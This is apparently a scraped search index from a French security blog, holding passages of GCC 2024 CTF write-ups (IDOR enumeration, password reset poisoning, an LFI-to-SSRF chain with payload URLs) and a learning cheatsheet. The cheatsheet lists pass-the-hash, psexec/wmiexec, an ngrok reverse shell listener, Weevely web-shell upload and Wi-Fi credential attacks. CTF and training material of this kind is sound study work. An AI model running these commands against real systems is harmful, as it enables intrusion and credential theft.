4 endpoints: /api/v1/register/ qui est désactivé /api/v1/login/, nécessite un compte /api/v1/reset-password/ que l’on a déjà entrevu, mais nécessite un compte /api/v1/user/{user_id} que l’on peut exploiter Énumérons ainsi les utilisateurs disponibles grâce à l’IDOR fournie par ce dernier endpoint: for i in {1..100}; do echo $(curl -s -X 'GET' 'http://172.17.0.2:8080/api/v1/user/'$i -H 'accept: application/json') ; done | grep true {\"admin\":true,\"id\":9,\"username\":\"isabel_castillo57\"} {\"admin\":true,\"id\":24,\"username\":\"william_glover68\"} {\"admin\":true,\"id\":31,\"username\":\"kimberly_jennings64\"} Password reset poisoning Que faire maintenant? En lisant PayloadAllTheThings sur les faiblesse des password reset on note: différence entre la gestion de l’identifiant ou le mail code “maison de cette feature et jeton prédictible empoisonnement du nom de domaine du lien Il s’agissait de cette dernière technique. Pour la mettre en place plusieurs outils existent, l’important est de disposer d’un serveur: burp collaborator (Pro..) requestbin ngrok Essayons avec la première utilisatrice: Ni une, ni deux on reçoit ce token: On s’empresse de suivre le lien: Et c’est gagné! ","date":"2024-03-04","objectID":"/posts/gcc-ctf/:5:1","tags":["android","crypto","reverse","machine learning","misc","web"],"title":"GCC 2024- Quelques writeups","uri":"/posts/gcc-ctf/"},{"categories":["writeup"],"content":"Free Chat Pour faire simple et concis, voici le writeup de l’auteur LFI En se créeant un compte pour l’application, nous avons accès à une application de chat Le paramètre name de visualisation de notre photo de profil http://worker02.gcc-ctf.com:12033/pfp?name=default.png est vulnérable à une File Inclusion (la suite de caractères ../ étant filtrée): Wildcard DNS \u0026 SSRF Il y a un manque de validation quand on “upload une image”. L’application vérifie que l’url d’upload commence par https://pbs.twimg.com mais http://pbs.twimg.com@7.tcp.eu.ngrok.io:19922 est accepté et redirige vers notre domaine. Voir plus de détails sur https://nip.io . Si l’on décode en base64 l’url-avatar http://pbs.twimg.com@localhost:1337, on obtient le code source de la page: \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eFreeChat - Dev Panel\u003c/title\u003e \u003cscript src=\"/static/js/hint.js\"\u003e\u003c/script\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv style=\"text-align: center;\"\u003e \u003ch1\u003eFreeChat - Dev Panel\u003c/h1\u003e \u003ch3\u003eWelcome dev, to access the panel, please enter your access token\u003c/h3\u003e \u003cform action=\"http://devpanel:8000/\" action=\"GET\"\u003e \u003cinput type=\"text\" name=\"token\" placeholder=\"Access Token\"\u003e \u003cinput type=\"submit\" value=\"Submit\"\u003e \u003c/form\u003e \u003cdiv\u003e \u003ch5 style=\"display: inline-block;\"\u003eForgot your token ? \u003c/h5\u003e \u003cbutton onclick=\"hint()\" style=\"display: inline-block;\"\u003eHint\u003c/button\u003e \u003c/div\u003e \u003cdiv id=\"hint\"\u003e\u003c/div\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e En regardant le hint avec http://pbs.twimg.com@localhost:1337/static/js/hint.js, on confirme qu’il faut là aussi un token: function hint(){ document.getElementById(\"hint\").innerHTML = \"\u003ch5\u003eHint: Don't be stupid admin, if you've lost the \u003cb\u003etoken\u003c/b\u003e you can still \u003cb\u003elocate\u003c/b\u003e it. Just think!\u003c/h5\u003e\" } Locate: /var/cache/locate/locatedb Ici vient une partie plus vicieuse, ne pouvant pas énumérer les dossiers, on doit utiliser en supposant qu’elle existe locatedb, stockant le PATH de l’application. On se rend donc ici http://worker02.gcc-ctf.com:12033/pfp?name=....//....//....//....//....//....//var/cache/locate/locatedb, ce qui télécharge le fichier puis on recherche: locate -d ./locatedb 'freechat' /freechat /freechat/app.py ... /home/freechat /home/freechat/.bash_logout /home/freechat/.bashrc /home/freechat/.for_d3vs_0nly /home/freechat/.for_d3vs_0nly/access_token.txt /home/freechat/.profile Le fichier http://worker05.gcc-ctf.com:12033/pfp?name=....//....//....//....//....//....//home/freechat/.for_d3vs_0nly/access_token.txt contient le sésame. On peut donc réutiliser la SSRF avec le token: http://pbs.twimg.com@devpanel:8000/?token=af33aa8342e212020e0ba08bca94e3559f82d3efb0eb7ec6e7eafbc11710f05b \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eDevPanel\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv style=\"text-align: center;\"\u003e \u003ch1\u003eDevPanel\u003c/h1\u003e \u003ch5\u003eHello dev, your flag is : GCC{L0c4t3_tr1ck+SsRf_1s_FuN}\u003c/h5\u003e \u003cp\u003eMade with ❤️ by Mika\u003c/p\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e Merci pour votre lecture! ","date":"2024-03-04","objectID":"/posts/gcc-ctf/:5:2","tags":["android","crypto","reverse","machine learning","misc","web"],"title":"GCC 2024- Quelques writeups","uri":"/posts/gcc-ctf/"},{"categories":["apprentissage"],"content":"Une roadmap en infosec","date":"2023-07-10","objectID":"/posts/cheatsheet/","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Dépôt Quelques catégories supplémentaires et notes actualisées https://github.com/4nuit/Hacking ","date":"2023-07-10","objectID":"/posts/cheatsheet/:1:0","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Intro Ce post est un peu spécial. En effet je tenais à partager quelques ressources, qui m’ont permis de mettre un pied dans l’infosec en partant de zéro. Est-ce légitime en 2023 de proposer cela? Effectivement, il y a pléthore d’articles, de blogs, de livres ainsi que de communautés. Mais il est facile de se confronter à un mur et de se décourager pour diverses raisons. Voici donc un agrégat de ressources, en français de préférence: ","date":"2023-07-10","objectID":"/posts/cheatsheet/:2:0","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Vulgarisation Des vidéos permettant de découvrir le sujet et de se donner un plan d’attaque. Hackintux: Hafnium: ","date":"2023-07-10","objectID":"/posts/cheatsheet/:3:0","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Les bases Juste quelques cours/playlists d’informatique générale pour donner une idée. Ok, sauf pour le web (OpenClassrooms peut suffire dans tous les cas) Linux: Programmation: Réseau: Web: Quelques communautés: https://lecrabeinfo.net/ https://openclassrooms.com/fr/courses https://zestedesavoir.com/ ","date":"2023-07-10","objectID":"/posts/cheatsheet/:4:0","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Teach yourself infosec A partir d’ici, la sécurité commence. https://owasp.org/www-community/attacks/ https://d3fend.mitre.org/ Quelques ressources très complètes ici, par thème. Pour chaque catégorie, des ressources et plateformes sont données pour s’entraîner. https://teachyourselfinfosec.com/ Dans la même idée, en français: https://secu.si/ https://wiki.zenk-security.com/doku.php/ https://www.bases-hacking.org/hacking.html De très bons livres (dont certains tirés d’OReilly), cours et articles (pas que sur la sécurité) existent aussi ici: https://doc.lagout.org/ ","date":"2023-07-10","objectID":"/posts/cheatsheet/:5:0","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Ressources On entre dans le vif du sujet. Maintenant, choisissez la catégorie qui vous plaît et n’hésitez pas à reprendre au point précédent. ","date":"2023-07-10","objectID":"/posts/cheatsheet/:6:0","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Active Directory ","date":"2023-07-10","objectID":"/posts/cheatsheet/:7:0","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Bases LDAP https://www-sop.inria.fr/members/Laurent.Mirtain/ldap-livre.html ","date":"2023-07-10","objectID":"/posts/cheatsheet/:7:1","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Documentation https://zer1t0.gitlab.io/posts/attacking_ad/ https://ntlm.info/ https://tesserent.com/insights/blog/dumping-windows-credentials?utm_source=securusglobal.com\u0026utm_medium=301 https://beta.hackndo.com/pass-the-hash/#protocole-ntlm mindmaphttps://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg ","date":"2023-07-10","objectID":"/posts/cheatsheet/:7:2","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Kerberoast SPN non vide https://beta.hackndo.com/kerberoasting/ GetUserSPNs.py ","date":"2023-07-10","objectID":"/posts/cheatsheet/:7:3","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"AsRepRoast User sans PreAuth https://beta.hackndo.com/kerberos-asrep-roasting/ https://www.login-securite.com/2022/11/03/analyse-et-poc-de-la-cve-2022-33679/ (UAC values) GetNPUsers.py Box Active (HTB) Synchroniser l’horloge: sudo ntpdate \u003cip\u003e crackmapexec: check GPPPassword (share spidering: spider_plus): cme smb \u003cDomain\u003e -u \u003cuser\u003e -p \u003cpass\u003e -M gpp_password check SamAccountName: crackmapexec smb \u003cip\u003e -M nopac \u0026 crackmapexec ldap -d \u003cDomain\u003e -u \u003cuser\u003e -p \u003cpass\u003e -M Maq (max machines à créer) Pass The Hash: crackmapexec \u003cip\u003e -u Administrator -H \u003clmhash:nthash\u003e -x 'whoami' ","date":"2023-07-10","objectID":"/posts/cheatsheet/:7:4","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Silver/Golden Ticket https://beta.hackndo.com/kerberos-silver-golden-tickets/#pac https://github.com/fortra/impacket/issues/1457 ","date":"2023-07-10","objectID":"/posts/cheatsheet/:7:5","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Shell Domain.local/Administrator@127.0.0.1 psexec.py \u003cDomain\u003e/\u003cuser\u003e:\u003cpass\u003e@\u003cDC.local\u003e wmiexec.py \u003cDomain\u003e/\u003cuser\u003e@\u003cDC.local\u003e -hashes ':\u003cnthash\u003e' ","date":"2023-07-10","objectID":"/posts/cheatsheet/:7:6","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"FreeRDP2 (TryHackMe AD Basics) xfreerdp /v:10.10.222.63 /u:THM\\Mark /p:M4rk3t1ng.21 ","date":"2023-07-10","objectID":"/posts/cheatsheet/:7:7","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Crypto ","date":"2023-07-10","objectID":"/posts/cheatsheet/:8:0","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Documentation https://joyofcryptography.com/ https://cryptobook.nakov.com/ ","date":"2023-07-10","objectID":"/posts/cheatsheet/:8:1","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Cle publique RSA, https://vozec.fr/crypto-rsa/ , Side Channel RSA - RSA CRT cf FCSC DSA,ElGamal, RSA-CRT - Zenk Shamir Secret Sharing ","date":"2023-07-10","objectID":"/posts/cheatsheet/:8:2","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Blocs AES, https://stackoverflow.com/questions/1220751/how-to-choose-an-aes-encryption-mode-cbc-ecb-ctr-ocb-cfb Block cipher modes of operation https://en.wikipedia.org/wiki/Padding_oracle_attack https://crypto.stackexchange.com/questions/42891/chosen-plaintext-attack-on-aes-in-ecb-mode https://security.stackexchange.com/questions/271007/aes-ecb-cookie-bypass https://crypto.stackexchange.com/questions/66085/bit-flipping-attack-on-cbc-mode https://research.nccgroup.com/2021/02/17/cryptopals-exploiting-cbc-padding-oracles/ https://vozec.fr/crypto-lattice/lattice-introduction/ ","date":"2023-07-10","objectID":"/posts/cheatsheet/:8:3","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Flux https://thehackernews.com/2015/07/crack-rc4-encryption.html https://crypto.stackexchange.com/questions/83629/forgery-attack-on-poly1305-when-the-key-and-nonce-reused ","date":"2023-07-10","objectID":"/posts/cheatsheet/:8:4","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Log Discret ","date":"2023-07-10","objectID":"/posts/cheatsheet/:8:5","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"ECC https://people.cs.nctu.edu.tw/~rjchen/ECC2012S/Elliptic%20Curves%20Number%20Theory%20And%20Cryptography%202n.pdf https://blog.trailofbits.com/2020/06/11/ecdsa-handle-with-care/ ","date":"2023-07-10","objectID":"/posts/cheatsheet/:8:6","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Cheatsheet https://github.com/zademn/EverythingCrypto https://github.com/jvdsn/crypto-attacks ","date":"2023-07-10","objectID":"/posts/cheatsheet/:8:7","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Outils z3 OpenSSL cheatsheet https://www.login-securite.com/2021/10/29/sthackwriteup-forensic-docker-layer/ # AES-CBC openssl aes-256-cbc -d -iter 10 -pass pass:$(cat /pass.txt) -in flag.enc -out flag.dec bash # Base64 \u0026 digest - JWT echo \u003cb64(header).b64(payload)\u003e | openssl dgst -sha256 -mac HMAC -macopt:hexkey:$(cat key.pem | xxd -p | tr -d \"\\\\n\") python -c 'import hmac, hashlib, base64; print(base64.urlsafe_b64encode(hmac.new(\u003ckey\u003e, \u003ctoken\u003e, hashlib.sha256).digest()).replace(\"=\", \"\"))' Hashes.com Dcode Cyberchef : Divers encodages/hashs et autres Alpertron : RSA (en + de factordb et simpy) https://github.com/tna0y/Python-random-module-cracker Gmpy2 Pycryptodome Sage (ECC) Sympy (docs) ","date":"2023-07-10","objectID":"/posts/cheatsheet/:8:8","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Cours: Cryptohack Starters https://github.com/0x14mth3n1ght/Hacking/tree/main/crypto/elliptic_curves ","date":"2023-07-10","objectID":"/posts/cheatsheet/:8:9","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Forensic ","date":"2023-07-10","objectID":"/posts/cheatsheet/:9:0","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Analyse de logs https://github.com/0x14mth3n1ght/Writeup/tree/master/2023/FCSC/forensic/weird_shell ","date":"2023-07-10","objectID":"/posts/cheatsheet/:9:1","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Exfiltration https://tshark.dev/ https://wiki.wireshark.org/SampleCaptures ","date":"2023-07-10","objectID":"/posts/cheatsheet/:9:2","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Tools: Autopsy binwalk (binwalk -e \u003cfile\u003e , binwalk -dd=\"*\" \u003cfile\u003e) Dive (docker) photorec (récupérer les fichiers supprimés (unlinkés) https://github.com/corkami/docs/blob/master/PDF/PDF.md volatility: - profils linux avec Vol2 (HackSecuReims) Une fois setup ci dessous effectué https://volatility3.readthedocs.io/en/latest/getting-started-linux-tutorial.html# ","date":"2023-07-10","objectID":"/posts/cheatsheet/:9:3","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Profils Linux (Vol3) python ~/volatility3/vol.py -f memory.dmp banners.Banners # Linux 5.x-y # Version souhaitée de l'OS FROM debian:bullseye ARG KERNEL_VERSION=5.10.0-21 ARG KERNEL_ARCH=amd64 # Update et installation des dépendances nécessaires à Dwarf2json # /!\\ # Il faut charger l'image `-dbg` avec la version trouvée pour avoir le fichier DWARF RUN apt update RUN apt install -y \\ linux-image-${KERNEL_VERSION}-${KERNEL_ARCH}-dbg \\ linux-headers-${KERNEL_VERSION}-${KERNEL_ARCH} \\ build-essential golang-go git make # Volatility3 # Récupération de Dwarf2json RUN git clone https://github.com/volatilityfoundation/dwarf2json WORKDIR dwarf2json # On build puis on génère le fichier JSON depuis le fichier DWARF RUN go mod download github.com/spf13/pflag RUN go build RUN ./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-${KERNEL_VERSION}-${KERNEL_ARCH} \u003e linux-image-${KERNEL_VERSION}-${KERNEL_ARCH}.json CMD [\"sleep\", \"3600\"] docker build -t dwarf2json . CONTAINER_ID=$(docker run -ti --rm -d dwarf2json) docker cp $CONTAINER_ID:/dwarf2json/linux-image-5.10.0-21-amd64.json volatility3/volatility3/symbols docker rm -f $CONTAINER_ID python volatility3/vol.py -f memory.dmp linux.bash ","date":"2023-07-10","objectID":"/posts/cheatsheet/:9:4","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Profils Android https://github.com/504ensicsLabs/LiME ","date":"2023-07-10","objectID":"/posts/cheatsheet/:9:5","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Pwn Voir reverse pour les bases. ","date":"2023-07-10","objectID":"/posts/cheatsheet/:10:0","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Documentation https://guyinatuxedo.github.io/ Vidéos/Plateformes/Docs: https://mksec.fr/tricks/pwn_ressources/ Overview du pwn en fr: https://own2pwn.fr The Shellcoder Handbook ","date":"2023-07-10","objectID":"/posts/cheatsheet/:10:1","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"ARM,MIPS,RISCV ","date":"2023-07-10","objectID":"/posts/cheatsheet/:10:2","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Arguments et payload https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection ","date":"2023-07-10","objectID":"/posts/cheatsheet/:10:3","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Pile/Stack https://thinkloveshare.com/hacking/pwn_1of4_buffer_overflow/ https://ir0nstone.gitbook.io/notes/types/stack ","date":"2023-07-10","objectID":"/posts/cheatsheet/:10:4","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Protections https://learn-cyber.net/article/What's-That-Preventing-Your-Exploit ASLR: randomise base address -\u003e Ret2libc PIE: randomise offset -\u003e Leak fonction (format string) CANARY ou SSP: https://learn-cyber.net/article/Understanding-and-Defeating-the-Canary ","date":"2023-07-10","objectID":"/posts/cheatsheet/:10:5","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Format Strings https://learn-cyber.net/article/Format-String-Vulnerabilities https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html https://axcheron.github.io/exploit-101-format-strings/ ","date":"2023-07-10","objectID":"/posts/cheatsheet/:10:6","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Tas/Heap https://samwho.dev/memory-allocation/ https://heap-exploitation.dhavalkapil.com/attacks/first_fit https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/ https://github.com/shellphish/how2heap ","date":"2023-07-10","objectID":"/posts/cheatsheet/:10:7","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Kernel https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/ Kernelmap interactive: https://makelinux.github.io/kernel/map/ Kernel: https://0xax.gitbooks.io/linux-insides/content/ ","date":"2023-07-10","objectID":"/posts/cheatsheet/:10:8","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Débuggers (pour binaires ELF (Linux), plus courants en pwn) voir ../tutos (cours/prog C) gdb pour pwn , pour la stack gdb-gef, pour la heap pwndbg r2: https://github.com/radareorg/radare2 ","date":"2023-07-10","objectID":"/posts/cheatsheet/:10:9","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Plateformes https://deusx64.ai/ https://exploit.education/ https://pwn.college/ https://ropemporium.com/ ","date":"2023-07-10","objectID":"/posts/cheatsheet/:10:10","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Reseau ","date":"2023-07-10","objectID":"/posts/cheatsheet/:11:0","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Documentation https://zestedesavoir.com/tutoriels/2789/les-reseaux-de-zero/ https://ctf-wiki.mahaloz.re/misc/traffic/introduction/ https://cheatsheet.haax.fr/shells-methods/reverse/ https://github.com/sergiomarotco/Network-segmentation-cheat-sheet https://github.com/V0lk3n/WirelessPentesting-CheatSheet ","date":"2023-07-10","objectID":"/posts/cheatsheet/:11:1","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Tools Bettercap Eaphammer Hex Packet Decoder Ngrok Revshells Tshark , https://wiki.wireshark.org/SampleCaptures ","date":"2023-07-10","objectID":"/posts/cheatsheet/:11:2","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Curl curl is a tool for transferring data from or to a server. It supports these protocols: DICT, FILE, FTP, FTPS, GOPHER, GOPHERS, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET or TFTP. The command is designed to work without user interaction. ","date":"2023-07-10","objectID":"/posts/cheatsheet/:11:3","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"HTTP Curl Options \u0026 POST ","date":"2023-07-10","objectID":"/posts/cheatsheet/:11:4","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"LDAP https://www-sop.inria.fr/members/Laurent.Mirtain/ldap-livre.html https://serverfault.com/questions/1083914/replace-anonymous-ldapsearch-command-with-curl-command ","date":"2023-07-10","objectID":"/posts/cheatsheet/:11:5","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Reverse/Web shell Configurer son /etc/hosts https://stackoverflow.com/questions/12260587/kerberos-fails-when-accessing-site-by-ip-address /etc/hosts ip DOMAIN ip DC Revere shell - Ngrok (Non nécessaire si l’attaquant et la cible sont sur le même réseau) #term1 ngrok config add-authtoken TOKEN ngrok tcp 4444 #Forwarding tcp://5.tcp.eu.ngrok.io:16833 -\u003e localhost:4444 #term2 nc -nlvp 4444 Web shell - Weevely weevely generate password shell.php5 weevely http://10.10.97.185/uploads/shell.php5 password ","date":"2023-07-10","objectID":"/posts/cheatsheet/:11:6","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Reverse Proxy Ip Spoofing sudo apt install nginx sudo vim etc/nginx/sites-available/default server { ... # remplacer location / location / { proxy_pass http://vulnerable-site.org ; proxy_set_header X-Forwarded-For $remote_addr ; } ... } sudo systemctl restart nginx firefox $(ip a s eth0 | awk -F'[/ ]+' '/inet[^6]/{print $3}')/page #http://vulnerable-site.org/page ","date":"2023-07-10","objectID":"/posts/cheatsheet/:11:7","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Wifi Arp Spoofing https://security.stackexchange.com/questions/225985/is-there-any-point-of-arp-spoofing-on-a-wifi-network sudo ip l set wlanx down sudo iw wlanx set monitor none sudo ip l set wlanx up sudo iw wlanx info sudo wireshark\u0026 https://dl.aircrack-ng.org/breakingwepandwpa.pdf WPA2 - PSK sudo docker run -it --privileged --rm --net=host bettercap/bettercap -iface wlanx #wifi.recon help wpapcap2john bettercap-wifi-handshakes.pcap https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/ WPA2 - EAP sudo python3 ./eaphammer –cert-wizard sudo python3 ./eaphammer -i wlan6 --creds -e \"xxx\" -b xx:xx:xx:xx:xx:xx #BSSID /MAC ","date":"2023-07-10","objectID":"/posts/cheatsheet/:11:8","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Reverse ","date":"2023-07-10","objectID":"/posts/cheatsheet/:12:0","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Introduction: Assembleur x86 https://beta.hackndo.com/assembly-basics/ ","date":"2023-07-10","objectID":"/posts/cheatsheet/:12:1","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Documentation https://www.begin.re https://reverse.zip https://tmpout.sh/ Plateforme Crackme.one Awesome Reversing +: https://github.com/wtsxDev/reverse-engineering https://bbinfosec.medium.com/reverse-engineering-resources-beginners-to-intermediate-guide-li\u003e https://www.youtube.com/@StephenChapman https://m.youtube.com/c/oalabs ","date":"2023-07-10","objectID":"/posts/cheatsheet/:12:2","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Quelques outils: À posséder: En ligne: Dogbolt (decompiler explorer): compare le pseudo code source de différents outils (Ghidra, Hex Rays, Ida, Binary Ninja) rapidement Disassembler.io Ghidra : https://ghidra-sre.org/ (clone d’après les sources du git) UPX unpacker : https://github.com/NozomiNetworks/upx-recovery-tool ","date":"2023-07-10","objectID":"/posts/cheatsheet/:12:3","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Windows Reverse: décompilos: DotPeek : https://www.jetbrains.com/fr-fr/decompiler/ -\u003e parfait pour du .NET DnSpy : https://github.com/dnSpy/dnSpy -\u003e plus maintenu ","date":"2023-07-10","objectID":"/posts/cheatsheet/:12:4","tags":["active directory","crypto","forensic","pwn","reseau","reverse","web","web3"],"title":"Cheatsheet","uri":"/posts/cheatsheet/"},{"categories":["apprentissage"],"content":"Linux Outils classiques: objdump: -t : afficher la table des symboles -\u003e si rien : voir ../../pwn/asm -h: afficher les sections ltrace: voir les fonctions de la libc appelées strace: voir les syscalls ldd: voir les bibliothèques/libc utilisées (Hijacking, ret2libc Débuggers: gdb: gef r2: https://github.com/radareorg/radare2 x64dbg (windows) alias pwndbg='gdb -x 